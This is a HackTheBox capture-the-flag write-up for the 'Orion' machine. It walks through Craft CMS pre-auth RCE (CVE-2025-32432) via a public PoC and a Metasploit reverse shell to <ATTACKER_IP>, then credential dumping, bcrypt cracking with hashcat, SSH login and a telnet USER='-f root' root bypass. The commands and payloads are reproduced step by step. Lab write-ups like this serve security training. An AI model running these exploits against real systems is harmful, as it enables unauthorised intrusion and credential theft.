# Orion — HackTheBox Writeup

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**IP:** `$TARGET`  
**Domain:** `orion.htb`  
**Tech Stack:** nginx, Craft CMS 5.6.16, MySQL, GNU inetutils telnet

---

## Attack Chain Overview

```
Craft CMS 5.6.16 unauthenticated RCE (CVE-2025-32432)
   → DB credentials + reverse shell as www-data
   → MySQL user table → bcrypt hash → hashcat → adam:darkangel
   → SSH as adam
   → ss -tulpn reveals telnet on 127.0.0.1:23
   → GNU inetutils telnet CVE-2026-24061 (USER env var)
   → root
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Fuzzing](#2-web-fuzzing)
3. [Craft CMS RCE — CVE-2025-32432](#3-craft-cms-rce--cve-2025-32432)
4. [Shell Stabilization](#4-shell-stabilization)
5. [Linux Enumeration and Hash Extraction](#5-linux-enumeration-and-hash-extraction)
6. [Hash Cracking](#6-hash-cracking)
7. [Lateral Movement — SSH as adam](#7-lateral-movement--ssh-as-adam)
8. [Privilege Escalation — Telnet CVE-2026-24061](#8-privilege-escalation--telnet-cve-2026-24061)
9. [Root Flag](#9-root-flag)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
nmap -sVC -p22,80 $TARGET -oN service
```

**Output:**
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The HTTP redirect reveals the vhost. Add it to `/etc/hosts`:

```bash
echo "$TARGET orion.htb" | sudo tee -a /etc/hosts
```

Related notes: [nmap](../../../tools/recon/nmap.md), [silent-scan](../../../tools/recon/silent-scan.md)

---

## 2. Web Fuzzing

```bash
gobuster dir -u http://orion.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

**Output:**
```
index                (Status: 200) [Size: 12272]
admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]
assets               (Status: 301) [Size: 178] [--> http://orion.htb/assets/]
logout               (Status: 302) [Size: 0] [--> http://orion.htb/]
p1                   (Status: 200) [Size: 12272]
```

The `/admin` panel and the `/api` endpoint (which leaks the framework version) were immediately interesting:

```
http://orion.htb/api → nginx/1.18.0 Yii Framework/2.0.51
http://orion.htb/admin/login → Craft CMS 5.6.16
```

Related notes: [gobuster](../../../tools/fuzz/gobuster.md)

---

## 3. Craft CMS RCE — CVE-2025-32432

Craft CMS 5.6.16 is vulnerable to **unauthenticated pre-auth RCE** via CVE-2025-32432. Confirmed with the check script:

```bash
git clone https://github.com/CTY-Research-1/CVE-2025-32432-PoC
cd CVE-2025-32432-PoC
chmod +x *.py
python3 craftcms_rce_php_check.py -u http://orion.htb
```

**Output:**
```
Total URLs scanned: 1
Vulnerable sites: 1
Detailed results saved to vulnerable.txt
```

Triggered RCE to dump environment and config values:

```bash
python3 craftcms_final_payload.py -u http://orion.htb -c "id"
cat exploit_response_*.html
```

**Output:**
```
CRAFT_DB_USER = root
CRAFT_DB_PASSWORD = SuperSecureCraft123Pass!
CRAFT_DB_DATABASE = orion
Security Key = RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
```

The Python PoC had reliability issues for an interactive shell. Switched to the Metasploit module for a stable meterpreter:

```bash
msfconsole -q
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set rhosts orion.htb
set rport 80
set lhost <ATTACKER_IP>
exploit
```

Full technique: [craftcms-rce-cve-2025-32432](../../../exploits/web-rce/craftcms-rce-cve-2025-32432.md)

---

## 4. Shell Stabilization

From the meterpreter session, drop to a proper shell and stabilize:

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
reset
```

---

## 5. Linux Enumeration and Hash Extraction

```bash
cat /etc/passwd | grep bash
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
adam:x:1000:1000::/home/adam:/bin/bash
```

The DB credentials were already recovered from the RCE output. Queried the database directly for user hashes:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -D orion
show tables;
select * from users;
```

**Output:**
```
adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

Related notes: [mysql](../../../tools/database/mysql.md)

---

## 6. Hash Cracking

Saved the bcrypt hash and cracked it (mode 3200):

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -O
hashcat -m 3200 hash.txt --show
```

**Output:**
```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

Related notes: [hashcat](../../../tools/creds/hashcat.md)

---

## 7. Lateral Movement — SSH as adam

```bash
ssh adam@$TARGET
# password: darkangel
cat /home/adam/user.txt
```

**User flag captured.**

---

## 8. Privilege Escalation — Telnet CVE-2026-24061

### Enumeration

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
ss -tulpn
```

`ss -tulpn` revealed an internal-only listener on port 23:

```
tcp  LISTEN  0  10  127.0.0.1:23  0.0.0.0:*
```

Port 23 is telnet. Confirmed the version:

```bash
telnet --version
# telnet (GNU inetutils) 2.7
```

### Exploitation — CVE-2026-24061

GNU inetutils telnet 2.7 is vulnerable to **CVE-2026-24061**: the telnet client passes the `USER` environment variable to the server's login process without sanitization. Setting `USER` to `-f root` causes the login daemon to authenticate as root without a password (equivalent to `login -f root`).

```bash
env USER='-f root' telnet -a 127.0.0.1 23
id
# uid=0(root) gid=0(root) groups=0(root)
```

The `-a` flag tells telnet to send the `USER` variable automatically. The combination with `-f root` tells the server-side login to skip authentication and use root.

Full technique: [telnet-user-env-privesc-cve-2026-24061](../../../exploits/network-services/telnet-user-env-privesc-cve-2026-24061.md)

---

## 9. Root Flag

```bash
cat /root/root.txt
```

**Root flag captured.**

---

## 10. Key Takeaways

1. **Unauthenticated CMS RCEs are high-value.** Craft CMS 5.6.16 gave us both DB credentials and a shell without any valid user account — always check `/admin/login` version banners and cross-reference against exploit databases immediately.
2. **When Python PoCs are flaky, fall back to Metasploit.** The module is often more stable for getting an interactive shell, even if the standalone PoC is faster for data exfiltration.
3. **Internal port 23 should raise alarms.** Telnet on loopback in 2026 almost always means a legacy service with weak auth. Enumerate internal sockets with `ss -tulpn` as soon as you have a user shell.
4. **Environment variable injection in telnet.** CVE-2026-24061 is a reminder that telnet's `-a` auto-login path and the `USER` env var create a trivial auth bypass when the server-side login daemon trusts the client-supplied username.
5. **Bcrypt hashes in databases are not always safe.** `$2y$13$` with `cost=13` is costly but rockyou still cracks short words — always attempt cracking before moving to more complex lateral movement paths.

---

## Related Notes

- [craftcms-rce-cve-2025-32432](../../../exploits/web-rce/craftcms-rce-cve-2025-32432.md)
- [telnet-user-env-privesc-cve-2026-24061](../../../exploits/network-services/telnet-user-env-privesc-cve-2026-24061.md)
- [mysql](../../../tools/database/mysql.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [nmap](../../../tools/recon/nmap.md)